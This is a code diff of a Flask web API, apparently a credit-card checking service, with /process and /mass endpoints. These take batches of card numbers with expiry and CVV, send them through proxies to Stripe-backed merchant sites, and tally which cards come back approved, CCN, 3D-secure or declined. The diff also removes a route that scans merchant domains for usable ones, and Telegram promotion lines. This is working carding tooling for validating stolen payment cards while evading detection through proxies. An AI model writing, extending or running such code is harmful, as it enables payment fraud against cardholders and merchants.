+            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV"}), 400
+
+        proxy_dict = parse_proxy(proxy_str)
         if not proxy_dict:
             return jsonify({"error": "Invalid proxy format"}), 400
-        
-        result = test_site_with_card(domain, proxy_dict)
-        
+
+        site = site.replace('https://', '').replace('http://', '').split('/')[0] if site else None
+
+        result = stripe_auth(cc, proxy_dict=proxy_dict, site_override=site)
         return jsonify(result)
-        
+
     except Exception as e:
-        logger.error(f"Test site error: {e}")
+        logger.error(f"/process error: {e}")
         return jsonify({"error": str(e)}), 500
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
-@app.route('/test_sites')
-def test_sites_request():
-    try:
-        key = request.args.get('key')
-        sites_param = request.args.get('sites')
-        proxy_str = request.args.get('proxy')
-        
-        if key != "afuona_2026":
-            return jsonify({"error": "Invalid API key"}), 401
-        
-        if not sites_param:
-            return jsonify({"error": "Missing sites"}), 400
-        
-        if not proxy_str:
-            return jsonify({"error": "Proxy is REQUIRED"}), 400
-        
-        domains = sites_param.split(',')[:50]
-        
-        proxy_dict = parse_proxy_format(proxy_str)
-        if not proxy_dict:
-            return jsonify({"error": "Invalid proxy format"}), 400
-        
-        results = []
-        working_sites = []
-        
-        for domain in domains:
-            domain = domain.strip()
-            result = test_site_with_card(domain, proxy_dict)
-            results.append(result)
-            if result.get("working"):
-                working_sites.append(result)
-        
-        selected = working_sites[0]["domain"] if working_sites else None
-        
-        return jsonify({
-            "results": results,
-            "selected": selected,
-            "stats": {
-                "total": len(results),
-                "working": len(working_sites)
-            }
-        })
-        
-    except Exception as e:
-        logger.error(f"Test sites error: {e}")
-        return jsonify({"error": str(e)}), 500
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
+
+
 @app.route('/mass')
 def mass_request():
     try:
-        key = request.args.get('key')
-        domain = request.args.get('site')
-        proxy_str = request.args.get('proxy')
-        cards_param = request.args.get('cards')
-        
-        if key != "afuona_2026":
+        key        = request.args.get('key')
+        cards_str  = request.args.get('cards')
+        proxy_str  = request.args.get('proxy')
+        site       = request.args.get('site', '')
+
+        if key != API_KEY:
             return jsonify({"error": "Invalid API key"}), 401
-        
-        if not domain:
-            return jsonify({"error": "Missing domain"}), 400
-        
-        if not cards_param:
+        if not cards_str:
             return jsonify({"error": "Missing cards"}), 400
-        
         if not proxy_str:
-            return jsonify({"error": "Proxy is REQUIRED"}), 400
-        
-        domain = domain.replace('https://', '').replace('http://', '').split('/')[0]
-        cards = cards_param.split(',')[:1000]
-        
-        proxy_dict = parse_proxy_format(proxy_str)
+            return jsonify({"error": "Proxy is required"}), 400
+
+        proxy_dict = parse_proxy(proxy_str)
         if not proxy_dict:
             return jsonify({"error": "Invalid proxy format"}), 400
-        
-        results = []
-        approved = 0
-        declined = 0
-        threed = 0
-        
+
+        site = site.replace('https://', '').replace('http://', '').split('/')[0] if site else None
+        cards = [c.strip() for c in cards_str.split(',') if c.strip()][:50]
+
+        results  = []
+        approved = ccn = threed = declined = 0
+
         for card in cards:
-            card = card.strip()
-            result = process_card_enhanced(domain, card, proxy_dict=proxy_dict)
-            
-            if result.get("Status") == "Approved":
-                approved += 1
-            elif "3d" in result.get("Response", "").lower() or "secure" in result.get("Response", "").lower():
-                threed += 1
-            else:
-                declined += 1
-            
+            res = stripe_auth(card, proxy_dict=proxy_dict, site_override=site)
+            s   = res.get('Status', 'Declined')
+            if s == 'Approved':   approved += 1
+            elif s == 'CCN':      ccn      += 1
+            elif s == '3D':       threed   += 1
+            else:                 declined += 1
             results.append({
-                "card": card,
-                "response": result.get("Response", "Unknown"),
-                "status": result.get("Status", "Unknown")
+                "card":     card,
+                "status":   s,
+                "response": res.get('Response', ''),
+                "time":     res.get('Time', 0),
+                "site":     res.get('Site', ''),
             })
-        
+
         return jsonify({
             "results": results,
             "stats": {
-                "total": len(results),
+                "total":    len(results),
                 "approved": approved,
+                "ccn":      ccn,
+                "3d":       threed,
                 "declined": declined,
-                "threed": threed
             }
         })
-        
+
     except Exception as e:
-        logger.error(f"Mass request error: {e}")
+        logger.error(f"/mass error: {e}")
         return jsonify({"error": str(e)}), 500
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
+
+
 @app.route('/test_proxy')
-def test_proxy_endpoint():
+def test_proxy_route():
     proxy_str = request.args.get('proxy')
-    
     if not proxy_str:
-        return jsonify({"error": "Missing proxy parameter"}), 400
-    
-    proxy_dict = parse_proxy_format(proxy_str)
+        return jsonify({"error": "Missing proxy"}), 400
+    proxy_dict = parse_proxy(proxy_str)
     if not proxy_dict:
         return jsonify({"error": "Invalid proxy format"}), 400
-    
-    is_working, result = test_proxy(proxy_dict)
-    
-    if is_working:
-        return jsonify({
-            "success": True,
-            "ip": result,
-            "proxy": proxy_str
-        })
-    else:
-        return jsonify({
-            "success": False,
-            "error": f"Proxy test failed: {result}"
-        }), 400
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
+    ok, result = test_proxy(proxy_dict)
+    if ok:
+        return jsonify({"success": True, "ip": result})
+    return jsonify({"success": False, "error": result}), 400
+
+
 @app.route('/health')
-def health_check():
-    return jsonify({"status": "healthy"}), 200
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
+def health():
+    return jsonify({"status": "healthy", "api": "Stripe Auth"}), 200
+
+
 @app.errorhandler(404)
-def not_found(error):
+def not_found(e):
     return jsonify({"error": "Endpoint not found"}), 404
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
+
+
 @app.errorhandler(500)
-def internal_error(error):
+def server_error(e):
     return jsonify({"error": "Internal server error"}), 500
+
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8000))
-    print(" AFUONA API -  Payment Gateway 🔥")
-    print("=" * 60)
-    print(f"🚀 Running on port: {port}")
-    print(f"📱 Telegram: https://t.me/afuonax")
-    print(f"👑 Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔")
-    print(f"🔑 API Key: afuona_2026")
-    print("=" * 60)
+    print("⚡ Stripe Auth API")
+    print("=" * 50)
+    print(f"🚀 Port: {port}")
+    print(f"🔑 Key: {API_KEY}")
+    print(f"🌐 Sites: {', '.join(STRIPE_SITES)}")
+    print("=" * 50)
     app.run(host='0.0.0.0', port=port, debug=False)
